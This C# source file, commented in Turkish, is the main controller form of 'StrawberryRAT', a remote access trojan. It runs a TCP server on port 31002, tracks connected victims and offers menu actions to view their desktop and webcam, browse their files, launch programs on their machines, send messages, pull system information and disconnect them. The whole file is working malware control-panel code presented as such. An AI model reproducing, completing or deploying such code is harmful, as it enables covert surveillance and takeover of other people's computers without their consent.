using Strawberry.Araclar;
using Strawberry.Formlar;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Resources;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using WatsonTcp;

namespace Strawberry
{
    public partial class StrawberryAnaEkran : Form
    {
        public static string dinlemeip = "127.0.0.1";

        //ResXResourceWriter wrx = new ResXResourceWriter("config.resx");

        public List<string> iplist = new List<string>();

        public StrawberryAnaEkran()
        {
            InitializeComponent();
            Control.CheckForIllegalCrossThreadCalls = false;
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void dinlemeyeBaşlaToolStripMenuItem_Click(object sender, EventArgs e)
        {
#if DEBUG
            MessageBox.Show("Strawberry DEBUG modunda çalışamaz.", "StrawberryRAT", MessageBoxButtons.OK, MessageBoxIcon.Information);
#else
            Server.server = new WatsonTcpServer(dinlemeip, 31002); //serverin ipsini ve portunu tanımladık

            eventtanimla(); //eventleri tanımladık

            Server.server.Start(); //serveri başlattık

            durumlabel.Text = "Dinleniyor...";
            durumlabel.ForeColor = Color.Lime;
            //durumlabel'i ayarladık

            logbox.AppendText("Server 31002 portundan dinleniyor..." + "\r\n");
#endif
        }

        private void durdurToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Server.server.Stop();
            //serveri durdurduk

            durumlabel.Text = "Dinlenmiyor.";
            durumlabel.ForeColor = Color.Red;
            //durumlabel'i ayarladık

            logbox.AppendText("Server'in dinlemesi durdu." + "\r\n");
        }

#region Eventler
        
        //Burda serverin mesaj geldi, kullanıcı bağlandı gibi eventlerini tanımlıyoruz.

        public void eventtanimla()
        {
            //eventleri tanımlama
            Server.server.Events.ClientConnected += baglantioldu;
            Server.server.Events.MessageReceived += mesajgeldi;
            Server.server.Events.ClientDisconnected += baglantikesildi;
        }

        public void baglantioldu(object sender, ConnectionEventArgs args)
        {
            logbox.AppendText("Client Bağlandı: " + args.IpPort + "\r\n");
            iplist.Add(args.IpPort); //ip listesine ekledik
        }

        public void baglantikesildi(object sender, DisconnectionEventArgs args)
        {
            logbox.AppendText("Bağlantı Kesildi: " + args.IpPort + "\r\n");
            
            foreach (DataGridViewRow row in clientdatagrid.Rows)
            {
                if ((string)row.Cells[0].Value == args.IpPort)
                {
                    int index = row.Index;
                    clientdatagrid.Rows.RemoveAt(index);
                }
            }

            iplist.Remove(args.IpPort); //ip listesinden çıkardık
        }

        public void mesajgeldi(object sender, MessageReceivedEventArgs args)
        {
            string mesaj = Encoding.UTF8.GetString(args.Data); //mesajı byte[]'dan string'e dönüştürdük

            if (bytearraystringmi(args.Data))
            {
                logbox.AppendText("Mesaj Geldi: " + args.IpPort + ": " + mesaj + "\r\n");
            }
            else
            {
                logbox.AppendText("Data Geldi: " + args.IpPort + ".\r\n");
            }

            string[] parcalar = mesaj.Split(':'); //mesajı işlemek için iki noktayla ayırdık

            if (parcalar[0] == "ekle")
            {
                //client tablosuna eklemek için "ekle" komutunu aldık
                //örnek: ekle:Kullanıcı Adı:Ping:İşletim Sistemi

                clientdatagrid.Rows.Add(args.IpPort, parcalar[1], parcalar[2], parcalar[3]); //tabloya ekledik.
            }

            if (parcalar[0] == "sistembilgisi")
            {
                MessageBox.Show($"Sistem Bilgisi:\r\nRam Miktarı: {parcalar[1]}\r\nİşlemci Adı: {parcalar[2]}", args.IpPort, MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
        }

        public static bool bytearraystringmi(IEnumerable<byte> source)
        {
            if (null == source)
                return true;

            return source.All(b => b >= 32 && b <= 127);
        }

#endregion

        private void hepsininBağlantısınıKesToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (string ipport in iplist)
            {
                Server.server.Send(ipport, "baglantiyikes");
            }
        }

        private void sagtikmenu_Opening(object sender, CancelEventArgs e)
        {
            if (clientdatagrid.SelectedRows.Count > 0)
            {
                sagtikmenu.Close();
            }
        }

        private void masaüstüGörüntülemeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            MasaustuGoruntuleme mg = new MasaustuGoruntuleme(clientdatagrid.CurrentRow.Cells[0].Value.ToString());
            mg.Show();
        }

        private void kameraGörüntülemeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            KameraGoruntuleme kg = new KameraGoruntuleme(clientdatagrid.CurrentRow.Cells[0].Value.ToString());
            kg.Show();
        }

        private void sistemBilgisiToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Server.server.Send(clientdatagrid.CurrentRow.Cells[0].Value.ToString(), "sistembilgisi");
        }

        private void kapatToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }

        private void programBaşlatToolStripMenuItem_Click(object sender, EventArgs e)
        {
            CalistirForm cls = new CalistirForm(clientdatagrid.CurrentRow.Cells[0].Value.ToString());

            cls.Show();
        }

        private void bağlantıyıKesToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            Server.server.Send(clientdatagrid.CurrentRow.Cells[0].Value.ToString(), "baglantiyikes");
        }

        private void manuelMesajGönderToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ManuelMesaj mmsj = new ManuelMesaj(clientdatagrid.CurrentRow.Cells[0].Value.ToString());
            mmsj.Show();
        }

        private void dosyaYöneticisiToolStripMenuItem_Click(object sender, EventArgs e)
        {
            DosyaYoneticisi dy = new DosyaYoneticisi(clientdatagrid.CurrentRow.Cells[0].Value.ToString());

            dy.Show();
        }
    }
}
